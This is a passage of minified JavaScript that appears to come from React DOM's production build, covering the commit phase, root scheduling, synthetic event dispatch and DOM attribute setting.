					: ((e.callbackNode = null), (e.callbackPriority = 0)),
				(a = (t.flags & 13878) !== 0),
				(t.subtreeFlags & 13878) !== 0 || a)
			) {
				(a = M.T),
					(M.T = null),
					(n = B.p),
					(B.p = 2),
					(i = re),
					(re |= 4);
				try {
					R9(e, t, l);
				} finally {
					(re = i), (B.p = n), (M.T = a);
				}
			}
			(Ye = 1), Hr(), Lr(), Br();
		}
	}
	function Hr() {
		if (Ye === 1) {
			Ye = 0;
			var e = dl,
				t = ga,
				l = (t.flags & 13878) !== 0;
			if ((t.subtreeFlags & 13878) !== 0 || l) {
				(l = M.T), (M.T = null);
				var a = B.p;
				B.p = 2;
				var n = re;
				re |= 4;
				try {
					vr(t, e);
					var u = tc,
						i = jf(e.containerInfo),
						s = u.focusedElem,
						m = u.selectionRange;
					if (
						i !== s &&
						s &&
						s.ownerDocument &&
						Ef(s.ownerDocument.documentElement, s)
					) {
						if (m !== null && wu(s)) {
							var S = m.start,
								T = m.end;
							if (
								(T === void 0 && (T = S), "selectionStart" in s)
							)
								(s.selectionStart = S),
									(s.selectionEnd = Math.min(
										T,
										s.value.length
									));
							else {
								var R = s.ownerDocument || document,
									E = (R && R.defaultView) || window;
								if (E.getSelection) {
									var j = E.getSelection(),
										W = s.textContent.length,
										k = Math.min(m.start, W),
										me =
											m.end === void 0
												? k
												: Math.min(m.end, W);
									!j.extend &&
										k > me &&
										((i = me), (me = k), (k = i));
									var y = Sf(s, k),
										g = Sf(s, me);
									if (
										y &&
										g &&
										(j.rangeCount !== 1 ||
											j.anchorNode !== y.node ||
											j.anchorOffset !== y.offset ||
											j.focusNode !== g.node ||
											j.focusOffset !== g.offset)
									) {
										var C = R.createRange();
										C.setStart(y.node, y.offset),
											j.removeAllRanges(),
											k > me
												? (j.addRange(C),
												  j.extend(g.node, g.offset))
												: (C.setEnd(g.node, g.offset),
												  j.addRange(C));
									}
								}
							}
						}
						for (R = [], j = s; (j = j.parentNode); )
							j.nodeType === 1 &&
								R.push({
									element: j,
									left: j.scrollLeft,
									top: j.scrollTop,
								});
						for (
							typeof s.focus == "function" && s.focus(), s = 0;
							s < R.length;
							s++
						) {
							var O = R[s];
							(O.element.scrollLeft = O.left),
								(O.element.scrollTop = O.top);
						}
					}
					(Zn = !!ec), (tc = ec = null);
				} finally {
					(re = n), (B.p = a), (M.T = l);
				}
			}
			(e.current = t), (Ye = 2);
		}
	}
	function Lr() {
		if (Ye === 2) {
			Ye = 0;
			var e = dl,
				t = ga,
				l = (t.flags & 8772) !== 0;
			if ((t.subtreeFlags & 8772) !== 0 || l) {
				(l = M.T), (M.T = null);
				var a = B.p;
				B.p = 2;
				var n = re;
				re |= 4;
				try {
					mr(e, t.alternate, t);
				} finally {
					(re = n), (B.p = a), (M.T = l);
				}
			}
			Ye = 3;
		}
	}
	function Br() {
		if (Ye === 4 || Ye === 3) {
			(Ye = 0), io();
			var e = dl,
				t = ga,
				l = va,
				a = Nr;
			(t.subtreeFlags & 10256) !== 0 || (t.flags & 10256) !== 0
				? (Ye = 5)
				: ((Ye = 0), (ga = dl = null), qr(e, e.pendingLanes));
			var n = e.pendingLanes;
			if (
				(n === 0 && (ol = null),
				cu(l),
				(t = t.stateNode),
				tt && typeof tt.onCommitFiberRoot == "function")
			)
				try {
					tt.onCommitFiberRoot(
						wa,
						t,
						void 0,
						(t.current.flags & 128) === 128
					);
				} catch {}
			if (a !== null) {
				(t = M.T), (n = B.p), (B.p = 2), (M.T = null);
				try {
					for (
						var u = e.onRecoverableError, i = 0;
						i < a.length;
						i++
					) {
						var s = a[i];
						u(s.value, { componentStack: s.stack });
					}
				} finally {
					(M.T = t), (B.p = n);
				}
			}
			(va & 3) !== 0 && On(),
				wt(e),
				(n = e.pendingLanes),
				(l & 4194090) !== 0 && (n & 42) !== 0
					? e === Yi
						? d1++
						: ((d1 = 0), (Yi = e))
					: (d1 = 0),
				h1(0);
		}
	}
	function qr(e, t) {
		(e.pooledCacheLanes &= t) === 0 &&
			((t = e.pooledCache), t != null && ((e.pooledCache = null), ka(t)));
	}
	function On(e) {
		return Hr(), Lr(), Br(), Yr();
	}
	function Yr() {
		if (Ye !== 5) return !1;
		var e = dl,
			t = Bi;
		Bi = 0;
		var l = cu(va),
			a = M.T,
			n = B.p;
		try {
			(B.p = 32 > l ? 32 : l), (M.T = null), (l = qi), (qi = null);
			var u = dl,
				i = va;
			if (((Ye = 0), (ga = dl = null), (va = 0), (re & 6) !== 0))
				throw Error(r(331));
			var s = re;
			if (
				((re |= 4),
				Er(u.current),
				br(u, u.current, i, l),
				(re = s),
				h1(0, !1),
				tt && typeof tt.onPostCommitFiberRoot == "function")
			)
				try {
					tt.onPostCommitFiberRoot(wa, u);
				} catch {}
			return !0;
		} finally {
			(B.p = n), (M.T = a), qr(e, t);
		}
	}
	function Gr(e, t, l) {
		(t = ht(l, t)),
			(t = vi(e.stateNode, t, 2)),
			(e = ll(e, t, 2)),
			e !== null && (Oa(e, 2), wt(e));
	}
	function xe(e, t, l) {
		if (e.tag === 3) Gr(e, e, l);
		else
			for (; t !== null; ) {
				if (t.tag === 3) {
					Gr(t, e, l);
					break;
				} else if (t.tag === 1) {
					var a = t.stateNode;
					if (
						typeof t.type.getDerivedStateFromError == "function" ||
						(typeof a.componentDidCatch == "function" &&
							(ol === null || !ol.has(a)))
					) {
						(e = ht(l, e)),
							(l = Vs(2)),
							(a = ll(t, l, 2)),
							a !== null && (ks(l, a, t, e), Oa(a, 2), wt(a));
						break;
					}
				}
				t = t.return;
			}
	}
	function Qi(e, t, l) {
		var a = e.pingCache;
		if (a === null) {
			a = e.pingCache = new D9();
			var n = new Set();
			a.set(t, n);
		} else (n = a.get(t)), n === void 0 && ((n = new Set()), a.set(t, n));
		n.has(l) ||
			((Di = !0), n.add(l), (e = q9.bind(null, e, t, l)), t.then(e, e));
	}
	function q9(e, t, l) {
		var a = e.pingCache;
		a !== null && a.delete(t),
			(e.pingedLanes |= e.suspendedLanes & l),
			(e.warmLanes &= ~l),
			ge === e &&
				(ue & l) === l &&
				(Ne === 4 ||
				(Ne === 3 && (ue & 62914560) === ue && 300 > Et() - Li)
					? (re & 2) === 0 && ya(e, 0)
					: (Ui |= l),
				xa === ue && (xa = 0)),
			wt(e);
	}
	function Zr(e, t) {
		t === 0 && (t = Lc()), (e = ta(e, t)), e !== null && (Oa(e, t), wt(e));
	}
	function Y9(e) {
		var t = e.memoizedState,
			l = 0;
		t !== null && (l = t.retryLane), Zr(e, l);
	}
	function G9(e, t) {
		var l = 0;
		switch (e.tag) {
			case 13:
				var a = e.stateNode,
					n = e.memoizedState;
				n !== null && (l = n.retryLane);
				break;
			case 19:
				a = e.stateNode;
				break;
			case 22:
				a = e.stateNode._retryCache;
				break;
			default:
				throw Error(r(314));
		}
		a !== null && a.delete(t), Zr(e, l);
	}
	function Z9(e, t) {
		return au(e, t);
	}
	var Rn = null,
		Ca = null,
		Vi = !1,
		zn = !1,
		ki = !1,
		ql = 0;
	function wt(e) {
		e !== Ca &&
			e.next === null &&
			(Ca === null ? (Rn = Ca = e) : (Ca = Ca.next = e)),
			(zn = !0),
			Vi || ((Vi = !0), Q9());
	}
	function h1(e, t) {
		if (!ki && zn) {
			ki = !0;
			do
				for (var l = !1, a = Rn; a !== null; ) {
					if (e !== 0) {
						var n = a.pendingLanes;
						if (n === 0) var u = 0;
						else {
							var i = a.suspendedLanes,
								s = a.pingedLanes;
							(u = (1 << (31 - lt(42 | e) + 1)) - 1),
								(u &= n & ~(i & ~s)),
								(u =
									u & 201326741
										? (u & 201326741) | 1
										: u
										? u | 2
										: 0);
						}
						u !== 0 && ((l = !0), kr(a, u));
					} else
						(u = ue),
							(u = L1(
								a,
								a === ge ? u : 0,
								a.cancelPendingCommit !== null ||
									a.timeoutHandle !== -1
							)),
							(u & 3) === 0 || Ma(a, u) || ((l = !0), kr(a, u));
					a = a.next;
				}
			while (l);
			ki = !1;
		}
	}
	function X9() {
		Xr();
	}
	function Xr() {
		zn = Vi = !1;
		var e = 0;
		ql !== 0 && (P9() && (e = ql), (ql = 0));
		for (var t = Et(), l = null, a = Rn; a !== null; ) {
			var n = a.next,
				u = Qr(a, t);
			u === 0
				? ((a.next = null),
				  l === null ? (Rn = n) : (l.next = n),
				  n === null && (Ca = l))
				: ((l = a), (e !== 0 || (u & 3) !== 0) && (zn = !0)),
				(a = n);
		}
		h1(e);
	}
	function Qr(e, t) {
		for (
			var l = e.suspendedLanes,
				a = e.pingedLanes,
				n = e.expirationTimes,
				u = e.pendingLanes & -62914561;
			0 < u;

		) {
			var i = 31 - lt(u),
				s = 1 << i,
				m = n[i];
			m === -1
				? ((s & l) === 0 || (s & a) !== 0) && (n[i] = po(s, t))
				: m <= t && (e.expiredLanes |= s),
				(u &= ~s);
		}
		if (
			((t = ge),
			(l = ue),
			(l = L1(
				e,
				e === t ? l : 0,
				e.cancelPendingCommit !== null || e.timeoutHandle !== -1
			)),
			(a = e.callbackNode),
			l === 0 ||
				(e === t && (oe === 2 || oe === 9)) ||
				e.cancelPendingCommit !== null)
		)
			return (
				a !== null && a !== null && nu(a),
				(e.callbackNode = null),
				(e.callbackPriority = 0)
			);
		if ((l & 3) === 0 || Ma(e, l)) {
			if (((t = l & -l), t === e.callbackPriority)) return t;
			switch ((a !== null && nu(a), cu(l))) {
				case 2:
				case 8:
					l = Dc;
					break;
				case 32:
					l = D1;
					break;
				case 268435456:
					l = Uc;
					break;
				default:
					l = D1;
			}
			return (
				(a = Vr.bind(null, e)),
				(l = au(l, a)),
				(e.callbackPriority = t),
				(e.callbackNode = l),
				t
			);
		}
		return (
			a !== null && a !== null && nu(a),
			(e.callbackPriority = 2),
			(e.callbackNode = null),
			2
		);
	}
	function Vr(e, t) {
		if (Ye !== 0 && Ye !== 5)
			return (e.callbackNode = null), (e.callbackPriority = 0), null;
		var l = e.callbackNode;
		if (On() && e.callbackNode !== l) return null;
		var a = ue;
		return (
			(a = L1(
				e,
				e === ge ? a : 0,
				e.cancelPendingCommit !== null || e.timeoutHandle !== -1
			)),
			a === 0
				? null
				: (Ar(e, a, t),
				  Qr(e, Et()),
				  e.callbackNode != null && e.callbackNode === l
						? Vr.bind(null, e)
						: null)
		);
	}
	function kr(e, t) {
		if (On()) return null;
		Ar(e, t, !0);
	}
	function Q9() {
		e0(function () {
			(re & 6) !== 0 ? au(_c, X9) : Xr();
		});
	}
	function Ki() {
		return ql === 0 && (ql = Hc()), ql;
	}
	function Kr(e) {
		return e == null || typeof e == "symbol" || typeof e == "boolean"
			? null
			: typeof e == "function"
			? e
			: Z1("" + e);
	}
	function Jr(e, t) {
		var l = t.ownerDocument.createElement("input");
		return (
			(l.name = t.name),
			(l.value = t.value),
			e.id && l.setAttribute("form", e.id),
			t.parentNode.insertBefore(l, t),
			(e = new FormData(e)),
			l.parentNode.removeChild(l),
			e
		);
	}
	function V9(e, t, l, a, n) {
		if (t === "submit" && l && l.stateNode === n) {
			var u = Kr((n[Je] || null).action),
				i = a.submitter;
			i &&
				((t = (t = i[Je] || null)
					? Kr(t.formAction)
					: i.getAttribute("formAction")),
				t !== null && ((u = t), (i = null)));
			var s = new k1("action", "action", null, a, n);
			e.push({
				event: s,
				listeners: [
					{
						instance: null,
						listener: function () {
							if (a.defaultPrevented) {
								if (ql !== 0) {
									var m = i ? Jr(n, i) : new FormData(n);
									hi(
										l,
										{
											pending: !0,
											data: m,
											method: n.method,
											action: u,
										},
										null,
										m
									);
								}
							} else
								typeof u == "function" &&
									(s.preventDefault(),
									(m = i ? Jr(n, i) : new FormData(n)),
									hi(
										l,
										{
											pending: !0,
											data: m,
											method: n.method,
											action: u,
										},
										u,
										m
									));
						},
						currentTarget: n,
					},
				],
			});
		}
	}
	for (var Ji = 0; Ji < zu.length; Ji++) {
		var $i = zu[Ji],
			k9 = $i.toLowerCase(),
			K9 = $i[0].toUpperCase() + $i.slice(1);
		bt(k9, "on" + K9);
	}
	bt(Af, "onAnimationEnd"),
		bt(wf, "onAnimationIteration"),
		bt(Mf, "onAnimationStart"),
		bt("dblclick", "onDoubleClick"),
		bt("focusin", "onFocus"),
		bt("focusout", "onBlur"),
		bt(r9, "onTransitionRun"),
		bt(o9, "onTransitionStart"),
		bt(d9, "onTransitionCancel"),
		bt(Of, "onTransitionEnd"),
		Vl("onMouseEnter", ["mouseout", "mouseover"]),
		Vl("onMouseLeave", ["mouseout", "mouseover"]),
		Vl("onPointerEnter", ["pointerout", "pointerover"]),
		Vl("onPointerLeave", ["pointerout", "pointerover"]),
		El(
			"onChange",
			"change click focusin focusout input keydown keyup selectionchange".split(
				" "
			)
		),
		El(
			"onSelect",
			"focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(
				" "
			)
		),
		El("onBeforeInput", [
			"compositionend",
			"keypress",
			"textInput",
			"paste",
		]),
		El(
			"onCompositionEnd",
			"compositionend focusout keydown keypress keyup mousedown".split(
				" "
			)
		),
		El(
			"onCompositionStart",
			"compositionstart focusout keydown keypress keyup mousedown".split(
				" "
			)
		),
		El(
			"onCompositionUpdate",
			"compositionupdate focusout keydown keypress keyup mousedown".split(
				" "
			)
		);
	var m1 =
			"abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(
				" "
			),
		J9 = new Set(
			"beforetoggle cancel close invalid load scroll scrollend toggle"
				.split(" ")
				.concat(m1)
		);
	function $r(e, t) {
		t = (t & 4) !== 0;
		for (var l = 0; l < e.length; l++) {
			var a = e[l],
				n = a.event;
			a = a.listeners;
			e: {
				var u = void 0;
				if (t)
					for (var i = a.length - 1; 0 <= i; i--) {
						var s = a[i],
							m = s.instance,
							S = s.currentTarget;
						if (
							((s = s.listener),
							m !== u && n.isPropagationStopped())
						)
							break e;
						(u = s), (n.currentTarget = S);
						try {
							u(n);
						} catch (T) {
							yn(T);
						}
						(n.currentTarget = null), (u = m);
					}
				else
					for (i = 0; i < a.length; i++) {
						if (
							((s = a[i]),
							(m = s.instance),
							(S = s.currentTarget),
							(s = s.listener),
							m !== u && n.isPropagationStopped())
						)
							break e;
						(u = s), (n.currentTarget = S);
						try {
							u(n);
						} catch (T) {
							yn(T);
						}
						(n.currentTarget = null), (u = m);
					}
			}
		}
	}
	function ne(e, t) {
		var l = t[fu];
		l === void 0 && (l = t[fu] = new Set());
		var a = e + "__bubble";
		l.has(a) || (Wr(t, e, 2, !1), l.add(a));
	}
	function Wi(e, t, l) {
		var a = 0;
		t && (a |= 4), Wr(l, e, a, t);
	}
	var _n = "_reactListening" + Math.random().toString(36).slice(2);
	function Fi(e) {
		if (!e[_n]) {
			(e[_n] = !0),
				Zc.forEach(function (l) {
					l !== "selectionchange" &&
						(J9.has(l) || Wi(l, !1, e), Wi(l, !0, e));
				});
			var t = e.nodeType === 9 ? e : e.ownerDocument;
			t === null || t[_n] || ((t[_n] = !0), Wi("selectionchange", !1, t));
		}
	}
	function Wr(e, t, l, a) {
		switch (b2(t)) {
			case 2:
				var n = C0;
				break;
			case 8:
				n = S0;
				break;
			default:
				n = oc;
		}
		(l = n.bind(null, t, l, e)),
			(n = void 0),
			!yu ||
				(t !== "touchstart" && t !== "touchmove" && t !== "wheel") ||
				(n = !0),
			a
				? n !== void 0
					? e.addEventListener(t, l, { capture: !0, passive: n })
					: e.addEventListener(t, l, !0)
				: n !== void 0
				? e.addEventListener(t, l, { passive: n })
				: e.addEventListener(t, l, !1);
	}
	function Pi(e, t, l, a, n) {
		var u = a;
		if ((t & 1) === 0 && (t & 2) === 0 && a !== null)
			e: for (;;) {
				if (a === null) return;
				var i = a.tag;
				if (i === 3 || i === 4) {
					var s = a.stateNode.containerInfo;
					if (s === n) break;
					if (i === 4)
						for (i = a.return; i !== null; ) {
							var m = i.tag;
							if (
								(m === 3 || m === 4) &&
								i.stateNode.containerInfo === n
							)
								return;
							i = i.return;
						}
					for (; s !== null; ) {
						if (((i = Zl(s)), i === null)) return;
						if (
							((m = i.tag),
							m === 5 || m === 6 || m === 26 || m === 27)
						) {
							a = u = i;
							continue e;
						}
						s = s.parentNode;
					}
				}
				a = a.return;
			}
		lf(function () {
			var S = u,
				T = gu(l),
				R = [];
			e: {
				var E = Rf.get(e);
				if (E !== void 0) {
					var j = k1,
						W = e;
					switch (e) {
						case "keypress":
							if (Q1(l) === 0) break e;
						case "keydown":
						case "keyup":
							j = Zo;
							break;
						case "focusin":
							(W = "focus"), (j = Eu);
							break;
						case "focusout":
							(W = "blur"), (j = Eu);
							break;
						case "beforeblur":
						case "afterblur":
							j = Eu;
							break;
						case "click":
							if (l.button === 2) break e;
						case "auxclick":
						case "dblclick":
						case "mousedown":
						case "mousemove":
						case "mouseup":
						case "mouseout":
						case "mouseover":
						case "contextmenu":
							j = uf;
							break;
						case "drag":
						case "dragend":
						case "dragenter":
						case "dragexit":
						case "dragleave":
						case "dragover":
						case "dragstart":
						case "drop":
							j = Oo;
							break;
						case "touchcancel":
						case "touchend":
						case "touchmove":
						case "touchstart":
							j = Vo;
							break;
						case Af:
						case wf:
						case Mf:
							j = _o;
							break;
						case Of:
							j = Ko;
							break;
						case "scroll":
						case "scrollend":
							j = wo;
							break;
						case "wheel":
							j = $o;
							break;
						case "copy":
						case "cut":
						case "paste":
							j = Uo;
							break;
						case "gotpointercapture":
						case "lostpointercapture":
						case "pointercancel":
						case "pointerdown":
						case "pointermove":
						case "pointerout":
						case "pointerover":
						case "pointerup":
							j = ff;
							break;
						case "toggle":
						case "beforetoggle":
							j = Fo;
					}
					var k = (t & 4) !== 0,
						me = !k && (e === "scroll" || e === "scrollend"),
						y = k ? (E !== null ? E + "Capture" : null) : E;
					k = [];
					for (var g = S, C; g !== null; ) {
						var O = g;
						if (
							((C = O.stateNode),
							(O = O.tag),
							(O !== 5 && O !== 26 && O !== 27) ||
								C === null ||
								y === null ||
								((O = _a(g, y)),
								O != null && k.push(p1(g, O, C))),
							me)
						)
							break;
						g = g.return;
					}
					0 < k.length &&
						((E = new j(E, W, null, l, T)),
						R.push({ event: E, listeners: k }));
				}
			}
			if ((t & 7) === 0) {
				e: {
					if (
						((E = e === "mouseover" || e === "pointerover"),
						(j = e === "mouseout" || e === "pointerout"),
						E &&
							l !== xu &&
							(W = l.relatedTarget || l.fromElement) &&
							(Zl(W) || W[Gl]))
					)
						break e;
					if (
						(j || E) &&
						((E =
							T.window === T
								? T
								: (E = T.ownerDocument)
								? E.defaultView || E.parentWindow
								: window),
						j
							? ((W = l.relatedTarget || l.toElement),
							  (j = S),
							  (W = W ? Zl(W) : null),
							  W !== null &&
									((me = v(W)),
									(k = W.tag),
									W !== me ||
										(k !== 5 && k !== 27 && k !== 6)) &&
									(W = null))
							: ((j = null), (W = S)),
						j !== W)
					) {
						if (
							((k = uf),
							(O = "onMouseLeave"),
							(y = "onMouseEnter"),
							(g = "mouse"),
							(e === "pointerout" || e === "pointerover") &&
								((k = ff),
								(O = "onPointerLeave"),
								(y = "onPointerEnter"),
								(g = "pointer")),
							(me = j == null ? E : za(j)),
							(C = W == null ? E : za(W)),
							(E = new k(O, g + "leave", j, l, T)),
							(E.target = me),
							(E.relatedTarget = C),
							(O = null),
							Zl(T) === S &&
								((k = new k(y, g + "enter", W, l, T)),
								(k.target = C),
								(k.relatedTarget = me),
								(O = k)),
							(me = O),
							j && W)
						)
							t: {
								for (k = j, y = W, g = 0, C = k; C; C = Sa(C))
									g++;
								for (C = 0, O = y; O; O = Sa(O)) C++;
								for (; 0 < g - C; ) (k = Sa(k)), g--;
								for (; 0 < C - g; ) (y = Sa(y)), C--;
								for (; g--; ) {
									if (
										k === y ||
										(y !== null && k === y.alternate)
									)
										break t;
									(k = Sa(k)), (y = Sa(y));
								}
								k = null;
							}
						else k = null;
						j !== null && Fr(R, E, j, k, !1),
							W !== null && me !== null && Fr(R, me, W, k, !0);
					}
				}
				e: {
					if (
						((E = S ? za(S) : window),
						(j = E.nodeName && E.nodeName.toLowerCase()),
						j === "select" || (j === "input" && E.type === "file"))
					)
						var Y = xf;
					else if (mf(E))
						if (gf) Y = c9;
						else {
							Y = u9;
							var le = n9;
						}
					else
						(j = E.nodeName),
							!j ||
							j.toLowerCase() !== "input" ||
							(E.type !== "checkbox" && E.type !== "radio")
								? S && pu(S.elementType) && (Y = xf)
								: (Y = i9);
					if (Y && (Y = Y(e, S))) {
						pf(R, Y, l, T);
						break e;
					}
					le && le(e, E, S),
						e === "focusout" &&
							S &&
							E.type === "number" &&
							S.memoizedProps.value != null &&
							mu(E, "number", E.value);
				}
				switch (((le = S ? za(S) : window), e)) {
					case "focusin":
						(mf(le) || le.contentEditable === "true") &&
							((Pl = le), (Mu = S), (Ga = null));
						break;
					case "focusout":
						Ga = Mu = Pl = null;
						break;
					case "mousedown":
						Ou = !0;
						break;
					case "contextmenu":
					case "mouseup":
					case "dragend":
						(Ou = !1), Nf(R, l, T);
						break;
					case "selectionchange":
						if (s9) break;
					case "keydown":
					case "keyup":
						Nf(R, l, T);
				}
				var Z;
				if (Nu)
					e: {
						switch (e) {
							case "compositionstart":
								var K = "onCompositionStart";
								break e;
							case "compositionend":
								K = "onCompositionEnd";
								break e;
							case "compositionupdate":
								K = "onCompositionUpdate";
								break e;
						}
						K = void 0;
					}
				else
					Fl
						? df(e, l) && (K = "onCompositionEnd")
						: e === "keydown" &&
						  l.keyCode === 229 &&
						  (K = "onCompositionStart");
				K &&
					(sf &&
						l.locale !== "ko" &&
						(Fl || K !== "onCompositionStart"
							? K === "onCompositionEnd" && Fl && (Z = af())
							: ((Pt = T),
							  (bu = "value" in Pt ? Pt.value : Pt.textContent),
							  (Fl = !0))),
					(le = Dn(S, K)),
					0 < le.length &&
						((K = new cf(K, e, null, l, T)),
						R.push({ event: K, listeners: le }),
						Z
							? (K.data = Z)
							: ((Z = hf(l)), Z !== null && (K.data = Z)))),
					(Z = Io ? e9(e, l) : t9(e, l)) &&
						((K = Dn(S, "onBeforeInput")),
						0 < K.length &&
							((le = new cf(
								"onBeforeInput",
								"beforeinput",
								null,
								l,
								T
							)),
							R.push({ event: le, listeners: K }),
							(le.data = Z))),
					V9(R, e, S, l, T);
			}
			$r(R, t);
		});
	}
	function p1(e, t, l) {
		return { instance: e, listener: t, currentTarget: l };
	}
	function Dn(e, t) {
		for (var l = t + "Capture", a = []; e !== null; ) {
			var n = e,
				u = n.stateNode;
			if (
				((n = n.tag),
				(n !== 5 && n !== 26 && n !== 27) ||
					u === null ||
					((n = _a(e, l)),
					n != null && a.unshift(p1(e, n, u)),
					(n = _a(e, t)),
					n != null && a.push(p1(e, n, u))),
				e.tag === 3)
			)
				return a;
			e = e.return;
		}
		return [];
	}
	function Sa(e) {
		if (e === null) return null;
		do e = e.return;
		while (e && e.tag !== 5 && e.tag !== 27);
		return e || null;
	}
	function Fr(e, t, l, a, n) {
		for (var u = t._reactName, i = []; l !== null && l !== a; ) {
			var s = l,
				m = s.alternate,
				S = s.stateNode;
			if (((s = s.tag), m !== null && m === a)) break;
			(s !== 5 && s !== 26 && s !== 27) ||
				S === null ||
				((m = S),
				n
					? ((S = _a(l, u)), S != null && i.unshift(p1(l, S, m)))
					: n || ((S = _a(l, u)), S != null && i.push(p1(l, S, m)))),
				(l = l.return);
		}
		i.length !== 0 && e.push({ event: t, listeners: i });
	}
	var $9 = /\r\n?/g,
		W9 = /\u0000|\uFFFD/g;
	function Pr(e) {
		return (typeof e == "string" ? e : "" + e)
			.replace(
				$9,
				`
`
			)
			.replace(W9, "");
	}
	function Ir(e, t) {
		return (t = Pr(t)), Pr(e) === t;
	}
	function Un() {}
	function he(e, t, l, a, n, u) {
		switch (l) {
			case "children":
				typeof a == "string"
					? t === "body" || (t === "textarea" && a === "") || Jl(e, a)
					: (typeof a == "number" || typeof a == "bigint") &&
					  t !== "body" &&
					  Jl(e, "" + a);
				break;
			case "className":
				q1(e, "class", a);
				break;
			case "tabIndex":
				q1(e, "tabindex", a);
				break;
			case "dir":
			case "role":
			case "viewBox":
			case "width":
			case "height":
				q1(e, l, a);
				break;
			case "style":
				ef(e, a, u);
				break;
			case "data":
				if (t !== "object") {
					q1(e, "data", a);
					break;
				}
			case "src":
			case "href":
				if (a === "" && (t !== "a" || l !== "href")) {
					e.removeAttribute(l);
					break;
				}
				if (
					a == null ||
					typeof a == "function" ||
					typeof a == "symbol" ||
					typeof a == "boolean"
				) {
					e.removeAttribute(l);
					break;
				}
				(a = Z1("" + a)), e.setAttribute(l, a);
				break;
			case "action":
			case "formAction":
				if (typeof a == "function") {
					e.setAttribute(
						l,
						"javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')"
					);
					break;
				} else
					typeof u == "function" &&
						(l === "formAction"
							? (t !== "input" &&
									he(e, t, "name", n.name, n, null),
							  he(e, t, "formEncType", n.formEncType, n, null),
							  he(e, t, "formMethod", n.formMethod, n, null),
							  he(e, t, "formTarget", n.formTarget, n, null))
							: (he(e, t, "encType", n.encType, n, null),
							  he(e, t, "method", n.method, n, null),
							  he(e, t, "target", n.target, n, null)));
				if (
					a == null ||
					typeof a == "symbol" ||
					typeof a == "boolean"
				) {
					e.removeAttribute(l);
					break;
				}
				(a = Z1("" + a)), e.setAttribute(l, a);
				break;
			case "onClick":
				a != null && (e.onclick = Un);
				break;
			case "onScroll":
				a != null && ne("scroll", e);
				break;
			case "onScrollEnd":
				a != null && ne("scrollend", e);
				break;
			case "dangerouslySetInnerHTML":
				if (a != null) {
					if (typeof a != "object" || !("__html" in a))
						throw Error(r(61));
					if (((l = a.__html), l != null)) {
						if (n.children != null) throw Error(r(60));
						e.innerHTML = l;
					}
				}
				break;
			case "multiple":
				e.multiple =
					a && typeof a != "function" && typeof a != "symbol";
				break;
			case "muted":
				e.muted = a && typeof a != "function" && typeof a != "symbol";
				break;
			case "suppressContentEditableWarning":
			case "suppressHydrationWarning":
			case "defaultValue":
			case "defaultChecked":
			case "innerHTML":
			case "ref":
				break;
			case "autoFocus":
				break;
			case "xlinkHref":
				if (
					a == null ||
					typeof a == "function" ||
					typeof a == "boolean" ||
					typeof a == "symbol"
				) {
					e.removeAttribute("xlink:href");
					break;
				}
				(l = Z1("" + a)),
					e.setAttributeNS(
						"http://www.w3.org/1999/xlink",
						"xlink:href",
						l
					);
				break;
			case "contentEditable":
			case "spellCheck":
			case "draggable":
			case "value":
			case "autoReverse":
			case "externalResourcesRequired":
			case "focusable":
			case "preserveAlpha":
				a != null && typeof a != "function" && typeof a != "symbol"
					? e.setAttribute(l, "" + a)
					: e.removeAttribute(l);
				break;
			case "inert":
			case "allowFullScreen":
			case "async":
			case "autoPlay":
			case "controls":
			case "default":
			case "defer":
			case "disabled":
			case "disablePictureInPicture":
			case "disableRemotePlayback":
			case "formNoValidate":
			case "hidden":
			case "loop":
			case "noModule":
			case "noValidate":
			case "open":
			case "playsInline":
			case "readOnly":
			case "required":
			case "reversed":
			case "scoped":
			case "seamless":
			case "itemScope":
				a && typeof a != "function" && typeof a != "symbol"
					? e.setAttribute(l, "")
					: e.removeAttribute(l);
				break;
			case "capture":
			case "download":
				a === !0
					? e.setAttribute(l, "")
					: a !== !1 &&
					  a != null &&
					  typeof a != "function" &&
					  typeof a != "symbol"
					? e.setAttribute(l, a)
					: e.removeAttribute(l);
				break;
			case "cols":
			case "rows":
			case "size":
			case "span":
				a != null &&
				typeof a != "function" &&
				typeof a != "symbol" &&
				!isNaN(a) &&
				1 <= a
					? e.setAttribute(l, a)
					: e.removeAttribute(l);
				break;
			case "rowSpan":
			case "start":
				a == null ||
				typeof a == "function" ||
				typeof a == "symbol" ||
				isNaN(a)
					? e.removeAttribute(l)
					: e.setAttribute(l, a);
				break;
			case "popover":
				ne("beforetoggle", e), ne("toggle", e), B1(e, "popover", a);
				break;
			case "xlinkActuate":
				Rt(e, "http://www.w3.org/1999/xlink", "xlink:actuate", a);
				break;
			case "xlinkArcrole":
				Rt(e, "http://www.w3.org/1999/xlink", "xlink:arcrole", a);
				break;
			case "xlinkRole":
				Rt(e, "http://www.w3.org/1999/xlink", "xlink:role", a);
				break;
			case "xlinkShow":
				Rt(e, "http://www.w3.org/1999/xlink", "xlink:show", a);
				break;
			case "xlinkTitle":
				Rt(e, "http://www.w3.org/1999/xlink", "xlink:title", a);
				break;
			case "xlinkType":
				Rt(e, "http://www.w3.org/1999/xlink", "xlink:type", a);
				break;
			case "xmlBase":
				Rt(e, "http://www.w3.org/XML/1998/namespace", "xml:base", a);
				break;
			case "xmlLang":
				Rt(e, "http://www.w3.org/XML/1998/namespace", "xml:lang", a);
				break;
			case "xmlSpace":
				Rt(e, "http://www.w3.org/XML/1998/namespace", "xml:space", a);
				break;
			case "is":
				B1(e, "is", a);
				break;
			case "innerText":
			case "textContent":
				break;
			default:
				(!(2 < l.length) ||
					(l[0] !== "o" && l[0] !== "O") ||
					(l[1] !== "n" && l[1] !== "N")) &&
					((l = To.get(l) || l), B1(e, l, a));
		}
	}
	function Ii(e, t, l, a, n, u) {
		switch (l) {
			case "style":
				ef(e, a, u);
				break;
			case "dangerouslySetInnerHTML":
				if (a != null) {
					if (typeof a != "object" || !("__html" in a))
						throw Error(r(61));
					if (((l = a.__html), l != null)) {
						if (n.children != null) throw Error(r(60));
						e.innerHTML = l;
					}
				}
				break;
			case "children":
				typeof a == "string"
					? Jl(e, a)
					: (typeof a == "number" || typeof a == "bigint") &&
					  Jl(e, "" + a);
				break;
			case "onScroll":
				a != null && ne("scroll", e);
				break;
			case "onScrollEnd":
				a != null && ne("scrollend", e);
				break;
			case "onClick":
				a != null && (e.onclick = Un);
				break;
